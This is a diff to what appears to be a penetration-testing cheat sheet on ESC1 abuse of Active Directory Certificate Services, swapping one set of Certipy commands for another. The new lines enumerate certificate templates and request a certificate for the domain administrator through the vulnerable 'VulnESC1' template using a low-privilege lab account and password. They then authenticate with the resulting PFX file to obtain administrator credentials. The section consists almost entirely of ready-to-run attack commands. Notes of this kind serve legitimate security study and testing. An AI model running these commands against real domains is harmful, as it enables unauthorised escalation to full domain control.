@@ -34,25 +34,20 @@ ldapsearch -x -H ldap://dc.domain.local \
 
 # ESC1 Exploitation with Certipy
 ```powershell
-# Request a certificate on behalf of the Domain Admin
-certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -target 192.168.0.150 \
-    -ca 'certificate-WIN-CERTIFICATE-CA' \
-    -template 'VulnESC1' \
-    -upn 'administrator@certificate.local' \
-    -ldap-scheme ldap
+# Enumeration
+certipy-ad find -u 'test@certificate.local' -p 'sako2005!' -dc-ip 192.168.0.150 -stdout
 
-# Get NT Hash from certificate
-certipy-ad auth \
-  -pfx administrator.pfx \
-  -dc-ip 10.10.10.10
+# Request Administrator TGT
+certipy-ad req \
+  -u 'test@certificate.local' -p 'sako2005!' \
+  -dc-ip 192.168.0.150 \
+  -target WIN-CERTIFICATE.certificate.local \
+  -ca 'certificate-WIN-CERTIFICATE-CA' \
+  -template 'VulnESC1' \
+  -upn 'administrator@certificate.local'
 
-# Get TGT from certificate
-certipy-ad auth \
-  -pfx administrator.pfx \
-  -domain domain.local \
-  -dc-ip 10.10.10.10
+# Authenticate
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip 192.168.0.150
 ```
 
 # ESC1 Exploitation With Certify and Rubeus
